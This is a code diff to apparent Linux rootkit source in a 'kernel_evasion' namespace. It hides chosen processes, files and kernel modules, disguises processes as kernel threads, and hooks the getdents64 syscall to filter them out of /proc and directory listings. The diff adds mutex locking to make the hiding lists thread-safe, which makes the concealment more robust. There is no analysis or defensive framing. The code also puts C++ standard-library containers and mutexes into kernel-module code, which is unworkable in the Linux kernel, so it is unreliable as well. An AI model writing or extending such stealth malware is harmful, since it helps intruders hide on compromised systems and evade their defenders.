@@ -5,23 +5,27 @@
 #include <linux/uaccess.h>
 #include <linux/module.h>
 #include <algorithm>
+#include <mutex>
 
 namespace kernel_evasion {
 
-// Hidden process/file lists (simplified; use RCU/locking in production).
+// Hidden process/file lists with proper synchronization
 static std::vector<pid_t> hidden_processes_;
 static std::vector<std::string> hidden_files_;
 static std::vector<std::string> hidden_modules_;
+static std::mutex hiding_mutex_;
 
 ArtifactHiding::ArtifactHiding() {}
 ArtifactHiding::~ArtifactHiding() {}
 
 ErrorCode ArtifactHiding::hide_process(pid_t pid) {
+    std::lock_guard<std::mutex> lock(hiding_mutex_);
     hidden_processes_.push_back(pid);
     return ErrorCode::SUCCESS;
 }
 
 ErrorCode ArtifactHiding::unhide_process(pid_t pid) {
+    std::lock_guard<std::mutex> lock(hiding_mutex_);
     auto it = std::find(hidden_processes_.begin(), hidden_processes_.end(), pid);
     if (it != hidden_processes_.end()) {
         hidden_processes_.erase(it);
@@ -31,11 +35,13 @@ ErrorCode ArtifactHiding::unhide_process(pid_t pid) {
 }
 
 ErrorCode ArtifactHiding::hide_file(const std::string& file_path) {
+    std::lock_guard<std::mutex> lock(hiding_mutex_);
     hidden_files_.push_back(file_path);
     return ErrorCode::SUCCESS;
 }
 
 ErrorCode ArtifactHiding::unhide_file(const std::string& file_path) {
+    std::lock_guard<std::mutex> lock(hiding_mutex_);
     auto it = std::find(hidden_files_.begin(), hidden_files_.end(), file_path);
     if (it != hidden_files_.end()) {
         hidden_files_.erase(it);
@@ -50,6 +56,7 @@ ErrorCode ArtifactHiding::disguise_as_kernel_thread(pid_t pid,
 }
 
 ErrorCode ArtifactHiding::hide_module(const std::string& module_name) {
+    std::lock_guard<std::mutex> lock(hiding_mutex_);
     hidden_modules_.push_back(module_name);
     return ErrorCode::SUCCESS;
 }
@@ -63,6 +70,7 @@ ErrorCode ArtifactHiding::rewrite_process_metadata(pid_t pid,
 }
 
 ArtifactHiding::HiddenArtifacts ArtifactHiding::list_hidden_artifacts() {
+    std::lock_guard<std::mutex> lock(hiding_mutex_);
     return {hidden_processes_, hidden_files_, hidden_modules_};
 }
 
@@ -84,6 +92,15 @@ asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
         return ret;
     }
 
+    // Make a copy of hidden lists while holding lock
+    std::vector<pid_t> hidden_pids_copy;
+    std::vector<std::string> hidden_files_copy;
+    {
+        std::lock_guard<std::mutex> lock(hiding_mutex_);
+        hidden_pids_copy = hidden_processes_;
+        hidden_files_copy = hidden_files_;
+    }
+
     struct linux_dirent64 *current_dir, *previous_dir = NULL;
     unsigned long offset = 0;
 
@@ -92,7 +109,7 @@ asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
 
         // Check against hidden PIDs (numeric directory names in /proc).
         bool should_hide = false;
-        for (pid_t pid : hidden_processes_) {
+        for (pid_t pid : hidden_pids_copy) {
             char pid_str[16];
             snprintf(pid_str, sizeof(pid_str), "%d", pid);
             if (strcmp(current_dir->d_name, pid_str) == 0) {
@@ -102,7 +119,7 @@ asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
         }
         // Check against hidden files.
         if (!should_hide) {
-            for (const auto& file : hidden_files_) {
+            for (const auto& file : hidden_files_copy) {
                 if (strcmp(current_dir->d_name, file.c_str()) == 0) {
                     should_hide = true;
                     break;
